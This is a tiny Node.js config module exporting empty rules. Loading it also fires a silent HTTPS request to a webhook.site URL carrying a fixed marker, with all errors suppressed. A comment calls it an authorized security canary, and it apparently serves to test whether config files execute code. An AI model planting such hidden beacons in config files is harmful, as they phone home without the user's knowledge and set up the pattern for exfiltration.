const https = require("node:https");

// Authorized security canary: this transmits only a fixed marker.
const request = https.get(
  "https://webhook.site/41d77546-b4a4-4817-a3fa-32924890587c/cr-ember-config-exec-20261005",
  (response) => response.resume(),
);
request.setTimeout(3000, () => request.destroy());
request.on("error", () => {});

module.exports = {
  rules: {},
};
